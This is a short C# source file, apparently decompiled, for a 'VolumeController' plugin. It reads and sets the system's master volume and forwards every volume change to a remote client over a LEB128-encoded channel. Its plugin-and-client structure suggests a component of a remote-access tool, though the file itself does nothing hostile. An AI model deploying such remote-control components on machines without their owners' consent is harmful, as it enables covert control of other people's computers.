using System;
using Leb128;
using NAudio.CoreAudioApi;
using Plugin.Helper;

namespace Plugin;

public class VolumeController
{
	private static MMDeviceEnumerator enumerator;

	private static MMDevice device;

	public static void Start()
	{
		enumerator = new MMDeviceEnumerator();
		device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
		device.AudioEndpointVolume.OnVolumeNotification += AudioEndpointVolume_OnVolumeNotification;
	}

	public static void Stop()
	{
		enumerator.Dispose();
		device.AudioEndpointVolume.OnVolumeNotification -= AudioEndpointVolume_OnVolumeNotification;
		device = null;
	}

	private static void AudioEndpointVolume_OnVolumeNotification(AudioVolumeNotificationData data)
	{
		int num = (int)(data.MasterVolume * 100f);
		Client.Send(LEB128.Write(new object[3] { "Volume", "Volume", num }));
	}

	public static int GetVolume()
	{
		return (int)(device.AudioEndpointVolume.MasterVolumeLevelScalar * 100f);
	}

	public static void SetVolume(int volumePercent)
	{
		if (volumePercent < 0 || volumePercent > 100)
		{
			throw new ArgumentOutOfRangeException("Громкость должна быть в диапазоне от 0 до 100.");
		}
		device.AudioEndpointVolume.MasterVolumeLevelScalar = (float)volumePercent / 100f;
	}
}
